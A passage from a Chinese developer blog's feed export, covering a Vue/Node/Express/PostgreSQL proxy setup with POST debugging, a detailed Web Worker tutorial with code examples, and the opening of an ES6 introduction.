.then(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;<span class="built_in">console</span>.log(response);&#125;)</span><br><span class="line">        .catch(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;<span class="built_in">console</span>.log(error);&#125;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/06/04/DF5JajCwtmrcign.png" alt="menu2/index.vue"></p>
<h3 id="3-设置代理与跨域"><a href="#3-设置代理与跨域" class="headerlink" title="3. 设置代理与跨域"></a>3. 设置代理与跨域</h3><ol>
<li>在根目录中创建 vue.config.js 文件，并写入以下内容<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">	devServer: &#123;</span><br><span class="line">		proxy: &#123;</span><br><span class="line">			<span class="string">&#x27;/api&#x27;</span>: &#123;</span><br><span class="line">				target: <span class="string">&#x27;http://127.0.0.1:8888/api&#x27;</span>,</span><br><span class="line">				changeOrigin: <span class="literal">true</span>, <span class="comment">// 解决跨域</span></span><br><span class="line">				pathRewrite: &#123;</span><br><span class="line">					<span class="string">&#x27;^/api&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">				&#125;,</span><br><span class="line">			&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
我这里就直接在模板上更改了</li>
</ol>
<p><img src="https://i.loli.net/2021/06/04/q35tOiB9csNQvgY.png" alt="vue.config.js"></p>
<ol start="2">
<li>更改main.js文件，加入以下内容<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"></span><br><span class="line">Vue.prototype.$http = axios;</span><br></pre></td></tr></table></figure>
<img src="https://i.loli.net/2021/06/04/KowcAi7rmEIuqXS.png" alt="main.js"></li>
</ol>
<h3 id="4-运行"><a href="#4-运行" class="headerlink" title="4. 运行"></a>4. 运行</h3><ol>
<li>确保node终端处于开启状态</li>
</ol>
<p><img src="https://i.loli.net/2021/06/04/OfKSGhBQFD1u4j6.png" alt="node"></p>
<ol start="2">
<li><code>npm run dev</code></li>
</ol>
<p><img src="https://i.loli.net/2021/06/04/p5Df2xB1Y3UaZne.png" alt="运行成功"></p>
<ol start="3">
<li>测试<br><img src="https://i.loli.net/2021/06/04/dkVRwe1jf54XcpU.png" alt="click"><br>点击之后终端成功返回数据<br><img src="https://i.loli.net/2021/06/04/9Zw7nMkdTj3WEgD.png" alt="over"></li>
</ol>
<h3 id="5-更新-post"><a href="#5-更新-post" class="headerlink" title="5. 更新-post"></a>5. 更新-post</h3><hr>
<p>更</p>
<hr>
<p>新</p>
<hr>
<p>刚开始只有一个get请求，后来换了张表又加入了一个post请求，于是又有了新的问题…</p>
<p>下面是sql以及post<br><img src="https://i.loli.net/2021/06/09/hjUNk4tm9qcCbLr.png" alt="sql.add"><br><img src="https://i.loli.net/2021/06/09/4tNkfW7MlDLebVo.png" alt="post"></p>
<p>运行之后发现post请求一直处于<code>pending</code>状态,并且node终端也报出了如下error<br><img src="https://i.loli.net/2021/06/09/QYeGEJz9kWCHBr8.png" alt="pending"><br><img src="https://i.loli.net/2021/06/09/2JO6MGeu1Uly98E.png" alt="node-error"></p>
<p>第一反应看看sql语句，但是并没有发现错误…于是百度post请求处于pending状态的相关问题于是在<code>mock/mock-server.js</code>中做了以下更改<br><img src="https://i.loli.net/2021/06/09/HagnECLjTV3mbMJ.png" alt="mock-server"><br><img src="https://i.loli.net/2021/06/09/3VkWl1ontO7UEb8.png" alt="mock-server"><br>但是改完之后post依旧还是pending状态，node终端的报错也依旧存在。<br>two days later ···<br>两天之后，继续百度，终于发现了sql语句的错误，于是做了以下更改<br><img src="https://i.loli.net/2021/06/09/pYSJ61xQrN7bcI2.png" alt="sqlUpdate"><br>果然！！！post请求发送成功，数据也成功插入到postgresql中。<br><img src="https://i.loli.net/2021/06/09/5laGKMWSInwJEcz.png" alt="suc"></p>
]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>Vue+Node+Express+postgresql</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0070</title>
    <url>/2021/06/05/%E6%89%93%E5%8D%A10070/</url>
    <content><![CDATA[<p><font color=#007d65>愿你执迷不悟时有人陪你颠沛流离，愿你幡然醒悟时物是人是。</font></p>
<h2 id="JS-浏览器模型"><a href="#JS-浏览器模型" class="headerlink" title="JS 浏览器模型"></a>JS 浏览器模型</h2><h3 id="15-Web-Worker"><a href="#15-Web-Worker" class="headerlink" title="15. Web Worker"></a>15. Web Worker</h3><h4 id="15-1-概述"><a href="#15-1-概述" class="headerlink" title="15.1 概述"></a>15.1 概述</h4><p>JavaScript 语言采用的是单线程模型，也就是说，所有任务只能在一个线程上完成，一次只能做一件事。前面的任务没做完，后面的任务只能等着。随着电脑计算能力的增强，尤其是多核 CPU 的出现，单线程带来很大的不便，无法充分发挥计算机的计算能力。</p>
<p>Web Worker 的作用，就是为 JavaScript 创造多线程环境，允许主线程创建 Worker 线程，将一些任务分配给后者运行。在主线程运行的同时，Worker 线程在后台运行，两者互不干扰。等到 Worker 线程完成计算任务，再把结果返回给主线程。这样的好处是，一些计算密集型或高延迟的任务可以交由 Worker 线程执行，主线程（通常负责 UI 交互）能够保持流畅，不会被阻塞或拖慢。</p>
<p>Worker 线程一旦新建成功，就会始终运行，不会被主线程上的活动（比如用户点击按钮、提交表单）打断。这样有利于随时响应主线程的通信。但是，这也造成了 Worker 比较耗费资源，不应该过度使用，而且一旦使用完毕，就应该关闭。</p>
<p>Web Worker 有以下几个使用注意点。</p>
<span id="more"></span>
<h5 id="（1）同源限制"><a href="#（1）同源限制" class="headerlink" title="（1）同源限制"></a>（1）同源限制</h5><p>分配给 Worker 线程运行的脚本文件，必须与主线程的脚本文件同源。</p>
<h5 id="（2）DOM-限制"><a href="#（2）DOM-限制" class="headerlink" title="（2）DOM 限制"></a>（2）DOM 限制</h5><p>Worker 线程所在的全局对象，与主线程不一样，无法读取主线程所在网页的 DOM 对象，也无法使用<code>document</code>、<code>window</code>、<code>parent</code>这些对象。但是，Worker 线程可以使用<code>navigator</code>对象和<code>location</code>对象。</p>
<h5 id="（3）全局对象限制"><a href="#（3）全局对象限制" class="headerlink" title="（3）全局对象限制"></a>（3）全局对象限制</h5><p>Worker 的全局对象<code>WorkerGlobalScope</code>，不同于网页的全局对象<code>Window</code>，很多接口拿不到。比如，理论上 Worker 线程不能使用<code>console.log</code>，因为标准里面没有提到 Worker 的全局对象存在<code>console</code>接口，只定义了<code>Navigator</code>接口和<code>Location</code>接口。不过，浏览器实际上支持 Worker 线程使用<code>console.log</code>，保险的做法还是不使用这个方法。</p>
<h5 id="（4）通信联系"><a href="#（4）通信联系" class="headerlink" title="（4）通信联系"></a>（4）通信联系</h5><p>Worker 线程和主线程不在同一个上下文环境，它们不能直接通信，必须通过消息完成。</p>
<h5 id="（5）脚本限制"><a href="#（5）脚本限制" class="headerlink" title="（5）脚本限制"></a>（5）脚本限制</h5><p>Worker 线程不能执行<code>alert()</code>方法和<code>confirm()</code>方法，但可以使用 XMLHttpRequest 对象发出 AJAX 请求。</p>
<h5 id="（6）文件限制"><a href="#（6）文件限制" class="headerlink" title="（6）文件限制"></a>（6）文件限制</h5><p>Worker 线程无法读取本地文件，即不能打开本机的文件系统（<code>file://</code>），它所加载的脚本，必须来自网络。</p>
<h4 id="15-2-基本用法"><a href="#15-2-基本用法" class="headerlink" title="15.2 基本用法"></a>15.2 基本用法</h4><h5 id="15-2-1-主线程"><a href="#15-2-1-主线程" class="headerlink" title="15.2.1 主线程"></a>15.2.1 主线程</h5><p>主线程采用<code>new</code>命令，调用<code>Worker()</code>构造函数，新建一个 Worker 线程。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> worker = <span class="keyword">new</span> Worker(<span class="string">&#x27;work.js&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><code>Worker()</code>构造函数的参数是一个脚本文件，该文件就是 Worker 线程所要执行的任务。由于 Worker 不能读取本地文件，所以这个脚本必须来自网络。如果下载没有成功（比如404错误），Worker 就会默默地失败。</p>
<p>然后，主线程调用<code>worker.postMessage()</code>方法，向 Worker 发消息。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">worker.postMessage(<span class="string">&#x27;Hello World&#x27;</span>);</span><br><span class="line">worker.postMessage(&#123;<span class="attr">method</span>: <span class="string">&#x27;echo&#x27;</span>, <span class="attr">args</span>: [<span class="string">&#x27;Work&#x27;</span>]&#125;);</span><br></pre></td></tr></table></figure>
<p><code>worker.postMessage()</code>方法的参数，就是主线程传给 Worker 的数据。它可以是各种数据类型，包括二进制数据。</p>
<p>接着，主线程通过<code>worker.onmessage</code>指定监听函数，接收子线程发回来的消息。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">worker.onmessage = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  doSomething(event.data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSomething</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 执行任务</span></span><br><span class="line">  worker.postMessage(<span class="string">&#x27;Work done!&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，事件对象的<code>data</code>属性可以获取 Worker 发来的数据。</p>
<p>Worker 完成任务以后，主线程就可以把它关掉。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">worker.terminate();</span><br></pre></td></tr></table></figure>
<h5 id="15-2-2-Worker-线程"><a href="#15-2-2-Worker-线程" class="headerlink" title="15.2.2 Worker 线程"></a>15.2.2 Worker 线程</h5><p>Worker 线程内部需要有一个监听函数，监听<code>message</code>事件。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">self.addEventListener(<span class="string">&#x27;message&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  self.postMessage(<span class="string">&#x27;You said: &#x27;</span> + e.data);</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>self</code>代表子线程自身，即子线程的全局对象。因此，等同于下面两种写法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 写法一</span></span><br><span class="line"><span class="built_in">this</span>.addEventListener(<span class="string">&#x27;message&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.postMessage(<span class="string">&#x27;You said: &#x27;</span> + e.data);</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法二</span></span><br><span class="line">addEventListener(<span class="string">&#x27;message&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  postMessage(<span class="string">&#x27;You said: &#x27;</span> + e.data);</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<p>除了使用<code>self.addEventListener()</code>指定监听函数，也可以使用<code>self.onmessage</code>指定。监听函数的参数是一个事件对象，它的<code>data</code>属性包含主线程发来的数据。<code>self.postMessage()</code>方法用来向主线程发送消息。</p>
<p>根据主线程发来的数据，Worker 线程可以调用不同的方法，下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">self.addEventListener(<span class="string">&#x27;message&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> data = e.data;</span><br><span class="line">  <span class="keyword">switch</span> (data.cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;start&#x27;</span>:</span><br><span class="line">      self.postMessage(<span class="string">&#x27;WORKER STARTED: &#x27;</span> + data.msg);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;stop&#x27;</span>:</span><br><span class="line">      self.postMessage(<span class="string">&#x27;WORKER STOPPED: &#x27;</span> + data.msg);</span><br><span class="line">      self.close(); <span class="comment">// Terminates the worker.</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      self.postMessage(<span class="string">&#x27;Unknown command: &#x27;</span> + data.msg);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>self.close()</code>用于在 Worker 内部关闭自身。</p>
<h5 id="15-2-3-Worker-加载脚本"><a href="#15-2-3-Worker-加载脚本" class="headerlink" title="15.2.3 Worker 加载脚本"></a>15.2.3 Worker 加载脚本</h5><p>Worker 内部如果要加载其他脚本，有一个专门的方法<code>importScripts()</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">importScripts(<span class="string">&#x27;script1.js&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>该方法可以同时加载多个脚本。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">importScripts(<span class="string">&#x27;script1.js&#x27;</span>, <span class="string">&#x27;script2.js&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h5 id="15-2-4-错误处理"><a href="#15-2-4-错误处理" class="headerlink" title="15.2.4 错误处理"></a>15.2.4 错误处理</h5><p>主线程可以监听 Worker 是否发生错误。如果发生错误，Worker 会触发主线程的<code>error</code>事件。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">worker.onerror = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(</span><br><span class="line">    <span class="string">&#x27;ERROR: Line &#x27;</span>, event.lineno, <span class="string">&#x27; in &#x27;</span>, event.filename, <span class="string">&#x27;: &#x27;</span>, event.message</span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line">worker.addEventListener(<span class="string">&#x27;error&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>Worker 内部也可以监听<code>error</code>事件。</p>
<h5 id="15-2-5-关闭-Worker"><a href="#15-2-5-关闭-Worker" class="headerlink" title="15.2.5 关闭 Worker"></a>15.2.5 关闭 Worker</h5><p>使用完毕，为了节省系统资源，必须关闭 Worker。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 主线程</span></span><br><span class="line">worker.terminate();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Worker 线程</span></span><br><span class="line">self.close();</span><br></pre></td></tr></table></figure>
<h4 id="15-3-数据通信"><a href="#15-3-数据通信" class="headerlink" title="15.3 数据通信"></a>15.3 数据通信</h4><p>前面说过，主线程与 Worker 之间的通信内容，可以是文本，也可以是对象。需要注意的是，这种通信是拷贝关系，即是传值而不是传址，Worker 对通信内容的修改，不会影响到主线程。事实上，浏览器内部的运行机制是，先将通信内容串行化，然后把串行化后的字符串发给 Worker，后者再将它还原。</p>
<p>主线程与 Worker 之间也可以交换二进制数据，比如 File、Blob、ArrayBuffer 等类型，也可以在线程之间发送。下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 主线程</span></span><br><span class="line"><span class="keyword">var</span> uInt8Array = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">10</span>));</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; uInt8Array.length; ++i) &#123;</span><br><span class="line">  uInt8Array[i] = i * <span class="number">2</span>; <span class="comment">// [0, 2, 4, 6, 8,...]</span></span><br><span class="line">&#125;</span><br><span class="line">worker.postMessage(uInt8Array);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Worker 线程</span></span><br><span class="line">self.onmessage = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> uInt8Array = e.data;</span><br><span class="line">  postMessage(<span class="string">&#x27;Inside worker.js: uInt8Array.toString() = &#x27;</span> + uInt8Array.toString());</span><br><span class="line">  postMessage(<span class="string">&#x27;Inside worker.js: uInt8Array.byteLength = &#x27;</span> + uInt8Array.byteLength);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>但是，拷贝方式发送二进制数据，会造成性能问题。比如，主线程向 Worker 发送一个 500MB 文件，默认情况下浏览器会生成一个原文件的拷贝。为了解决这个问题，JavaScript 允许主线程把二进制数据直接转移给子线程，但是一旦转移，主线程就无法再使用这些二进制数据了，这是为了防止出现多个线程同时修改数据的麻烦局面。这种转移数据的方法，叫做Transferable Objects。这使得主线程可以快速把数据交给 Worker，对于影像处理、声音处理、3D 运算等就非常方便了，不会产生性能负担。</p>
<p>如果要直接转移数据的控制权，就要使用下面的写法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Transferable Objects 格式</span></span><br><span class="line">worker.postMessage(arrayBuffer, [arrayBuffer]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 例子</span></span><br><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">1</span>);</span><br><span class="line">worker.postMessage(ab, [ab]);</span><br></pre></td></tr></table></figure>
<h4 id="15-4-同页面的-Web-Worker"><a href="#15-4-同页面的-Web-Worker" class="headerlink" title="15.4 同页面的 Web Worker"></a>15.4 同页面的 Web Worker</h4><p>通常情况下，Worker 载入的是一个单独的 JavaScript 脚本文件，但是也可以载入与主线程在同一个网页的代码。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;script id=<span class="string">&quot;worker&quot;</span> type=<span class="string">&quot;app/worker&quot;</span>&gt;</span><br><span class="line">      addEventListener(<span class="string">&#x27;message&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        postMessage(<span class="string">&#x27;some message&#x27;</span>);</span><br><span class="line">      &#125;, <span class="literal">false</span>);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>上面是一段嵌入网页的脚本，注意必须指定<code>&lt;script&gt;</code>标签的<code>type</code>属性是一个浏览器不认识的值，上例是<code>app/worker</code>。</p>
<p>然后，读取这一段嵌入页面的脚本，用 Worker 来处理。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> blob = <span class="keyword">new</span> Blob([<span class="built_in">document</span>.querySelector(<span class="string">&#x27;#worker&#x27;</span>).textContent]);</span><br><span class="line"><span class="keyword">var</span> url = <span class="built_in">window</span>.URL.createObjectURL(blob);</span><br><span class="line"><span class="keyword">var</span> worker = <span class="keyword">new</span> Worker(url);</span><br><span class="line"></span><br><span class="line">worker.onmessage = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// e.data === &#x27;some message&#x27;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>上面代码中，先将嵌入网页的脚本代码，转成一个二进制对象，然后为这个二进制对象生成 URL，再让 Worker 加载这个 URL。这样就做到了，主线程和 Worker 的代码都在同一个网页上面。</p>
<h4 id="15-5-实例：Worker-线程完成轮询"><a href="#15-5-实例：Worker-线程完成轮询" class="headerlink" title="15.5 实例：Worker 线程完成轮询"></a>15.5 实例：Worker 线程完成轮询</h4><p>有时，浏览器需要轮询服务器状态，以便第一时间得知状态改变。这个工作可以放在 Worker 里面。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createWorker</span>(<span class="params">f</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> blob = <span class="keyword">new</span> Blob([<span class="string">&#x27;(&#x27;</span> + f.toString() + <span class="string">&#x27;)()&#x27;</span>]);</span><br><span class="line">  <span class="keyword">var</span> url = <span class="built_in">window</span>.URL.createObjectURL(blob);</span><br><span class="line">  <span class="keyword">var</span> worker = <span class="keyword">new</span> Worker(url);</span><br><span class="line">  <span class="keyword">return</span> worker;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> pollingWorker = createWorker(<span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> cache;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">compare</span>(<span class="params"><span class="keyword">new</span>, old</span>) </span>&#123; ... &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    fetch(<span class="string">&#x27;/my-api-endpoint&#x27;</span>).then(<span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> data = res.json();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!compare(data, cache)) &#123;</span><br><span class="line">        cache = data;</span><br><span class="line">        self.postMessage(data);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;, <span class="number">1000</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">pollingWorker.onmessage = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// render data</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pollingWorker.postMessage(<span class="string">&#x27;init&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码中，Worker 每秒钟轮询一次数据，然后跟缓存做比较。如果不一致，就说明服务端有了新的变化，因此就要通知主线程。</p>
<h4 id="15-6-实例：-Worker-新建-Worker"><a href="#15-6-实例：-Worker-新建-Worker" class="headerlink" title="15.6 实例： Worker 新建 Worker"></a>15.6 实例： Worker 新建 Worker</h4><p>Worker 线程内部还能再新建 Worker 线程（目前只有 Firefox 浏览器支持）。下面的例子是将一个计算密集的任务，分配到10个 Worker。</p>
<p>主线程代码如下。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> worker = <span class="keyword">new</span> Worker(<span class="string">&#x27;worker.js&#x27;</span>);</span><br><span class="line">worker.onmessage = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">document</span>.getElementById(<span class="string">&#x27;result&#x27;</span>).textContent = event.data;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>Worker 线程代码如下。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// worker.js</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// settings</span></span><br><span class="line"><span class="keyword">var</span> num_workers = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">var</span> items_per_worker = <span class="number">1000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// start the workers</span></span><br><span class="line"><span class="keyword">var</span> result = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> pending_workers = num_workers;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; num_workers; i += <span class="number">1</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> worker = <span class="keyword">new</span> Worker(<span class="string">&#x27;core.js&#x27;</span>);</span><br><span class="line">  worker.postMessage(i * items_per_worker);</span><br><span class="line">  worker.postMessage((i + <span class="number">1</span>) * items_per_worker);</span><br><span class="line">  worker.onmessage = storeResult;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// handle the results</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">storeResult</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  result += event.data;</span><br><span class="line">  pending_workers -= <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (pending_workers &lt;= <span class="number">0</span>)</span><br><span class="line">    postMessage(result); <span class="comment">// finished!</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，Worker 线程内部新建了10个 Worker 线程，并且依次向这10个 Worker 发送消息，告知了计算的起点和终点。计算任务脚本的代码如下。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// core.js</span></span><br><span class="line"><span class="keyword">var</span> start;</span><br><span class="line">onmessage = getStart;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getStart</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  start = event.data;</span><br><span class="line">  onmessage = getEnd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> end;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getEnd</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  end = event.data;</span><br><span class="line">  onmessage = <span class="literal">null</span>;</span><br><span class="line">  work();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">work</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = start; i &lt; end; i += <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// perform some complex calculation here</span></span><br><span class="line">    result += <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  postMessage(result);</span><br><span class="line">  close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="15-7-API"><a href="#15-7-API" class="headerlink" title="15.7 API"></a>15.7 API</h4><h5 id="15-7-1-主线程"><a href="#15-7-1-主线程" class="headerlink" title="15.7.1 主线程"></a>15.7.1 主线程</h5><p>浏览器原生提供<code>Worker()</code>构造函数，用来供主线程生成 Worker 线程。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myWorker = <span class="keyword">new</span> Worker(jsUrl, options);</span><br></pre></td></tr></table></figure>
<p><code>Worker()</code>构造函数，可以接受两个参数。第一个参数是脚本的网址（必须遵守同源政策），该参数是必需的，且只能加载 JS 脚本，否则会报错。第二个参数是配置对象，该对象可选。它的一个作用就是指定 Worker 的名称，用来区分多个 Worker 线程。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 主线程</span></span><br><span class="line"><span class="keyword">var</span> myWorker = <span class="keyword">new</span> Worker(<span class="string">&#x27;worker.js&#x27;</span>, &#123; <span class="attr">name</span> : <span class="string">&#x27;myWorker&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Worker 线程</span></span><br><span class="line">self.name <span class="comment">// myWorker</span></span><br></pre></td></tr></table></figure>
<p><code>Worker()</code>构造函数返回一个 Worker 线程对象，用来供主线程操作 Worker。Worker 线程对象的属性和方法如下。</p>
<ul>
<li>Worker.onerror：指定 error 事件的监听函数。</li>
<li>Worker.onmessage：指定 message 事件的监听函数，发送过来的数据在<code>Event.data</code>属性中。</li>
<li>Worker.onmessageerror：指定 messageerror 事件的监听函数。发送的数据无法序列化成字符串时，会触发这个事件。</li>
<li>Worker.postMessage()：向 Worker 线程发送消息。</li>
<li>Worker.terminate()：立即终止 Worker 线程。</li>
</ul>
<h5 id="15-7-2-Worker-线程"><a href="#15-7-2-Worker-线程" class="headerlink" title="15.7.2 Worker 线程"></a>15.7.2 Worker 线程</h5><p>Web Worker 有自己的全局对象，不是主线程的<code>window</code>，而是一个专门为 Worker 定制的全局对象。因此定义在<code>window</code>上面的对象和方法不是全部都可以使用。</p>
<p>Worker 线程有一些自己的全局属性和方法。</p>
<ul>
<li>self.name： Worker 的名字。该属性只读，由构造函数指定。</li>
<li>self.onmessage：指定<code>message</code>事件的监听函数。</li>
<li>self.onmessageerror：指定 messageerror 事件的监听函数。发送的数据无法序列化成字符串时，会触发这个事件。</li>
<li>self.close()：关闭 Worker 线程。</li>
<li>self.postMessage()：向产生这个 Worker 的线程发送消息。</li>
<li>self.importScripts()：加载 JS 脚本。<br>（完）<br><code>Well.that&#39;s all for today</code></li>
</ul>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS 浏览器模型-Web Worker</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0071</title>
    <url>/2021/06/09/%E6%89%93%E5%8D%A10071/</url>
    <content><![CDATA[<p><font color=#ffc20e>生活如此美好，忧伤总会逃掉，既然阳光照耀，就报之以微笑。</font></p>
<h2 id="ES6"><a href="#ES6" class="headerlink" title="ES6"></a>ES6</h2><h3 id="1-ECMAScript-6-简介"><a href="#1-ECMAScript-6-简介" class="headerlink" title="1. ECMAScript 6 简介"></a>1. ECMAScript 6 简介</h3><p>ECMAScript 6.0（以下简称 ES6）是 JavaScript 语言的下一代标准，已经在 2015 年 6 月正式发布了。它的目标，是使得 JavaScript 语言可以用来编写复杂的大型应用程序，成为企业级开发语言。</p>
